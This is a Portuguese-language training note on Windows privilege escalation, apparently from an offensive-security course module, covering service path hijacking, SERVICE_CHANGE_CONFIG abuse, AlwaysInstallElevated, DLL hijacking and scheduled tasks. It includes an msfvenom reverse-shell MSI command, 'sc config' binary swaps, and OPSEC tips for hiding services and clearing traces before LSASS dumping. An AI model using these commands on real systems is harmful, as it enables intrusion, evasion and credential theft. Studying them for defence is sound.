1. Identificar servicos com caminhos graváveis (`accesschk.exe` ou PowerUp)
2. Fazer backup do binário original
3. Substituir pelo malware
4. Aguardar ou forcar reinício do servico
5. Malware executa com privilégios SYSTEM

**Deteccao:**
```powershell
# Identificar servicos com caminhos graváveis
Get-WmiObject Win32_Service | Where-Object { $_.PathName -match "Program Files" } |
Select-Object Name, PathName, StartMode
```

---

#### T1574.009 - Unquoted Service Path

**Problema:** Alguns servicos usam caminhos sem aspas com espacos:
```
C:\Program Files\App 01\service.exe
```

**Comportamento do Windows:** Tenta os caminhos na ordem:
1. `C:\Program.exe`
2. `C:\Program Files\App.exe`
3. `C:\Program Files\App 01\service.exe`

Isso ocorre porque espacos podem ser argumentos (`cmd /c dir`).

**Exploit:**
- O atacante coloca malware em qualquer um dos caminhos tentados antes do correto
- Se tiver acesso de escrita em `C:\` ou `C:\Program Files\`, pode colocar `Program.exe` ou `App.exe`
- O servico executará o malware com privilégios SYSTEM

**Identificar via PowerShell:**
```powershell
# Listar servicos com caminhos sem aspas
wmic service get name,displayname,pathname,startmode |
findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """"
```

---

#### T1574.011 - SERVICE_CHANGE_CONFIG

**Cenário:** O atacante nao tem acesso de escrita ao binário do servico, mas tem permissao `SERVICE_CHANGE_CONFIG`.

**Como funciona:**
- Servicos mal configurados podem conceder permissao `SERVICE_CHANGE_CONFIG` a usuários comuns
- Esta permissao permite alterar o caminho do binário do servico
- O atacante muda o caminho para seu malware

**Exploit:**
```cmd
sc config <nome_do_servico> binPath= "C:\caminho\malware.exe"
sc start <nome_do_servico>
```

---

#### T1218 - AlwaysInstallElevated (Pacotes MSI)

**Como funciona:**
- Chave de registro que permite instalar pacotes MSI com privilégios elevados
- Criar um arquivo `.msi` malicioso e instalar
- Nenhum prompt UAC aparece, instalacao ocorre com High Integrity

**Chaves de registro:**
```
HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
Valor: AlwaysInstallElevated = 1
```

**AMBAS as chaves precisam ter o valor = 1** para a elevacao automática ocorrer.

**Criar MSI malicioso:**
```bash
# Com msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f msi -o malware.msi

# Instalar na vítima
msiexec /quiet /qn /i malware.msi
```

**Verificar se está habilitado:**
```powershell
Get-ItemProperty HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
```

---

#### T1574.001 - DLL Order Hijacking para Escalada de Privilégios

**Ordem de busca padrao do Windows para DLLs:**

**Pré-search (antes da ordem padrao):**
1. DLLs já carregadas em memória
2. Known DLLs (`HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`)

**Standard Search Order:**
3. Diretório da aplicacao (Application's directory) — MAIOR PRIORIDADE
4. `C:\Windows\System32\`
5. `C:\Windows\System\` (16-bit)
6. `C:\Windows\`
7. Current directory
8. Diretórios no `%PATH%`

**Exploit:**
1. Identificar app com High Integrity que carrega uma DLL
2. Ter acesso de escrita em um caminho ANTES do caminho correto
3. Colocar malware com o nome da DLL nesse caminho
4. Malware é carregado no processo com High Integrity
5. Malware pode carregar a DLL original para nao quebrar o processo pai

---

#### T1053.005 - Modifiable Scheduled Task File

**Como funciona:**
- Tasks agendadas podem rodar com privilégios elevados (High Integrity)
- Se o app agendado estiver em caminho gravável, o atacante pode sobrescrevê-lo

**Fluxo de ataque:**
1. Enumerar tasks agendadas e seus binários
2. Verificar se o binário da task está em caminho gravável
3. Substituir o binário pelo malware
4. Aguardar a task executar com High Integrity

---

### Fluxo Completo: De Usuário para SYSTEM

Exercício do módulo (fontes em `Priv.zip`):

```
Passo 1: Estar em Medium Integrity (shell normal)
    ↓
Passo 2: Usar bypass UAC (ex: fodhelper ou eventvwr)
    ↓
Passo 3: Agora em High Integrity (admin)
    ↓
Passo 4: Criar servico Windows apontando para o malware
    (OpenSCManager + CreateService + StartService em C++)
    ↓
Passo 5: Malware executa como SYSTEM
    ↓
Passo 6: Acesso total ao sistema
    (SAM dump, LSASS/Mimikatz, desabilitar AV, etc.)
```

---

### Mapeamento ATT&CK - Módulo 07

| Técnica | ID MITRE | Método |
|---------|----------|--------|
| Abuse Elevation Control Mechanism: Bypass UAC | T1548.002 | eventvwr, fodhelper, slui, sdclt |
| Hijack Execution Flow: DLL Side-Loading | T1574.002 | DLL em caminho com prioridade |
| Hijack Execution Flow: DLL Search Order Hijacking | T1574.001 | DLL em diretório de aplicacao |
| Create or Modify System Process: Windows Service | T1543.003 | OpenSCManager + CreateService |
| Scheduled Task/Job: Scheduled Task | T1053.005 | Modifiable task file |
| System Services: Service Execution | T1569.002 | sc config + sc start |
| Exploitation for Privilege Escalation | T1068 | Vulnerabilidades no kernel |

---

### OPSEC para Escalada de Privilégios - MalTrak

1. **Testar nível de integridade primeiro**: `whoami /groups` mostra o nível atual
2. **Preferir técnicas sem processo novo visível**: eventvwr e fodhelper sao silenciosos
3. **Limpar registro após UAC bypass**: remover chaves criadas em HKCU após uso
4. **Nao criar servicos com nomes óbvios**: usar nomes que imitam servicos legítimos
5. **Verificar EDR antes de usar Mimikatz**: mesmo com SYSTEM, dump de LSASS pode ser bloqueado
6. **Verificar AlwaysInstallElevated antes de usar MSI**: nao tentar sem confirmar as chaves

### Ferramentas Adicionais - Módulo 07

- **sigcheck** (Sysinternals): identificar processos AutoElevados com manifesto XML
- **accesschk** (Sysinternals): verificar permissoes em servicos e caminhos (`accesschk.exe -uwcqv * /accepteula`)
- **PowerUp** (PowerSploit): enumeracao automatizada de vetores de privesc
- **UACME**: https://github.com/hfiref0x/UACME (colecao de bypasses UAC)
- **winPEAS**: enumeracao automatizada de privesc em Windows
- **Process Monitor** (Sysinternals): monitorar quais DLLs aplicacoes buscam (e onde)
